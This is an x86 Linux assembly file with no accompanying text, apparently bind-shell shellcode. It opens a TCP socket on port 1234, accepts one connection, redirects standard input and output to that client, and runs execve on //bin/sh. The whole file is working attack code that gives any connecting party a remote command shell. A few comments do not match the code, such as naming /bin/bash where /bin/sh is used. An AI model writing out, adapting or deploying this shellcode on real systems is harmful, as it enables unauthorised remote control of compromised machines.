section .text
global _start

_start:
	; clear registers
	xor eax, eax
	xor ebx, ebx
	xor esi, esi
	; creating socket. 3 args
	push esi	; 3rd arg, choose default proto
	push 0x1	; 2nd arg, 1 equal SOCK_STREAM, TCP
	push 0x2	; 1st arg, 2 means Internet family proto
	; calling socket call for socket creating
	mov al, 102	; socketcall
	mov bl, 1	; 1 = socket()
	mov ecx, esp	; pointer to args of socket()
	int 0x80
	; in eax socket file descriptor. Save it
	mov edx, eax

	; creating sockaddr_in addr struct for bind
	push esi		; address, 0 - all interfaces
	push WORD 0xd204	; port 1234.
	push WORD 2		; AF_INET
	mov ecx, esp		; pointer to sockaddr_in struct
	push 0x16		; size of struct
	push ecx		; pushing pointer to struct
	push edx		; pushing socket descriptor
	; socketcall
	mov al, 102		; socketcall() number
	mov bl, 2		; bind()
	mov ecx, esp		; 2nd argument - pointer to args
	int 0x80

	; creating listen
	push 1			; listen for 1 client
	push edx		; clients queue size
	; calling socketcall
	mov al, 102
	mov bl, 4		; listen()
	mov ecx, esp
	int 0x80

	; creating accept()
	push esi		; use default value
	push esi		; use default value
	push edx		; sockfd
	; calling socketcall
	mov al, 102
	mov bl, 5		; accept()
	mov ecx, esp
	int 0x80

	mov edx, eax		; saving client file descriptor

	; dup2 STDIN, STDOUT, STDERR
	xor ecx, ecx		; clear ecx
	mov cl, 3		; number of loops
	mov ebx, edx		; socketfd
dup:	dec ecx
	mov al, 63		; number of dup2 syscall()
	int 0x80
	jns dup			; repeat for 1,0

	; execve /bin/bash
	xor eax, eax		; clear eax
	push eax		; string terminator
	push 0x68732f2f		; //bin/sh
	push 0x6e69622f
        mov ebx, esp		; 1st arg - address of //bin/sh
        push eax		; 
        mov edx, eax		; last argument is zero
        push ebx		; 2nd arg - pointer to all args of command
        mov ecx, esp		; pointer to args
        mov al, 11		; execve syscall number
        int 0x80

